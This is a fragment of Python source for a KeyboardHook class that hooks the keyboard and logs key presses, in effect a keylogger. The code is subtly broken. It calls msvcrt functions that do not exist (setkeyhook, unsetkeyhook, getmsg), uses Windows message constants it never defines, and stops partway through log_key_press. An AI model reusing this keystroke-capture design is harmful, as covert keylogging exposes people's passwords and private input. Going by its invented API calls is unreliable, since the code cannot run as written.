import threading
import msvcrt
import logging
import sys
import time

class KeyboardHook:
    def __init__(self):
        self.keylog_buffer = b''
        self.i = 0
        self.is_logging = False
        self.key_hook = None
        self.msg_hook = None

    def set_log_buffer(self, size):
        self.keylog_buffer = bytes(size)

    def get_log_buffer(self):
        return self.keylog_buffer

    def start_logging(self):
        self.key_hook = self.install_keyboard_hook()
        self.is_logging = True

    def stop_logging(self):
        self.is_logging = False
        self.uninstall_keyboard_hook()

    def install_keyboard_hook(self):
        self.key_hook = msvcrt.setkeyhook(self.keyboard_callback)
        if self.key_hook == 0:
            raise Exception("Error installing keyboard hook")
        return self.key_hook

    def uninstall_keyboard_hook(self):
        if self.key_hook:
            msvcrt.unsetkeyhook(self.key_hook)
            self.key_hook = 0

    def keyboard_callback(self, nCode, wParam, lParam):
        if nCode == HC_ACTION and wParam in (WM_SYSKEYDOWN, WM_KEYDOWN):
            kb_struct = msvcrt.getmsg(lParam)
            if kb_struct.message == WM_KEYDOWN:
                self.log_key_press(kb_struct.wParam, kb_struct.scanCode)

    def log_key_press(self, vk_code, scan_code):
